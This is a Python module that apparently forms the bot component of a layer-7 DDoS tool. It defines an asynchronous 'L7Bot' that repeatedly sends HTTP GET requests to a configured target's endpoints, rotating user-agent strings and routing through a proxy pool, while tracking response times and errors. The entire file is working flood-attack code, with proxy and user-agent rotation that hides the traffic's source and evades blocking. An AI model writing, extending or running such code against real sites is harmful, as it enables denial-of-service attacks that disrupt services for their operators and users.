import time, asyncio, random
from pathlib import Path
from ddos.proxy.proxy import ProxyPool
from utils.utils import load_json


ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l7ddos.json")
TARGET = ddos_config["l7"]["TARGET"]
ENDPOINTS = ddos_config["l7"]["ENDPOINTS"]
USER_AGENTS = ddos_config["l7"]["USER_AGENTS"]


class L7Bot:
    def __init__(self, num: int):
        self.target = TARGET
        self.endpoints = ENDPOINTS
        self.user_agents = USER_AGENTS
        self.name = f"bot{num}"
        self.text = None

    async def job(self, session, limiter, stats, stop_time, pool: ProxyPool | None):
        while time.time() < stop_time:
            await limiter.acquire()
            endpoint = random.choice(self.endpoints)
            headers = {"User-Agent": random.choice(self.user_agents)}
            proxy_url = None
            if pool:
                p = await pool.acquire(timeout=1.0)
                if p is None:
                    await asyncio.sleep(0.1)
                    continue
                proxy_url = p.url

            start = time.time()
            try:
                async with session.get(self.target + endpoint, headers=headers, proxy=proxy_url, timeout=10) as resp:
                    self.text = await resp.text()
                    response_time = (time.time() - start) * 1000.0
                    stats['response_times'].append(response_time)
                    stats['http_codes'].append(resp.status)
                    if pool:
                        pool.report_success(p)
            except Exception as e:
                stats['errors_count'] += 1
                if pool:
                    pool.report_failure(p)
            finally:
                if pool:
                    pool.release(p)
            await asyncio.sleep(0)